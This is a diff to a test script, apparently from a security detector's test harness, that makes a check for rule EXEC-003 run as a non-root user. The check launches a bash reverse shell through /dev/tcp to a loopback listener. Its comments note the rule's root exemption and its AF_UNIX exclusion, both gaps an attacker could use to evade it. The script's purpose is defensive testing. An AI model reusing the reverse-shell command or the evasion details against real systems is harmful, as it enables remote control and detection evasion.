@@ -9,12 +9,20 @@
 #
 # Loopback TCP qualifies. The detector only excludes AF_UNIX (which
 # is what systemd uses), not loopback IPv4.
+#
+# Must run as a non-root user: the rule has a documented euid==0
+# exemption (admin SSH→nc, incident-response rescue shells), so a
+# reverse shell launched from root is suppressed by design. We drop
+# to TEST_USER. EXEC-003 has no watched-uid gate — any non-root uid
+# triggers the rule — so this works regardless of cfm_watched_uids
+# population on panel hosts.
 
 set -uo pipefail
 . "$HARNESS_DIR/lib.sh"
 
 PORT="${LISTENER_PORT:-4444}"
-note "[EXEC-003] reverse-shell pattern against 127.0.0.1:$PORT"
+note "[EXEC-003] reverse-shell pattern against 127.0.0.1:$PORT as $TEST_USER"
+ensure_test_user
 
 # Start a minimal one-shot listener in the background. python3 is
 # universally available on the test boxes the harness targets and
@@ -52,10 +60,13 @@ start_pos=$(mark_log_position)
 # and gives us a TCP socket on fd 3 without forking nc. We then dup
 # fd 3 onto 0, 1, 2 and exec /bin/bash — the resulting bash invocation
 # has all three stdio fds on the same AF_INET ESTABLISHED socket.
-trace "bash reverse shell -> 127.0.0.1:$PORT"
-( exec 3<>/dev/tcp/127.0.0.1/$PORT
-  exec 0<&3 1>&3 2>&3
-  exec /bin/bash -i ) &
+# Runs as TEST_USER so the rule's euid==0 exemption doesn't suppress.
+trace "runuser -u $TEST_USER -- bash reverse shell -> 127.0.0.1:$PORT"
+run_as_test_user bash -c "
+    exec 3<>/dev/tcp/127.0.0.1/$PORT
+    exec 0<&3 1>&3 2>&3
+    exec /bin/bash -i
+" &
 trigger_pid=$!
 wait "$trigger_pid" 2>/dev/null || true
 
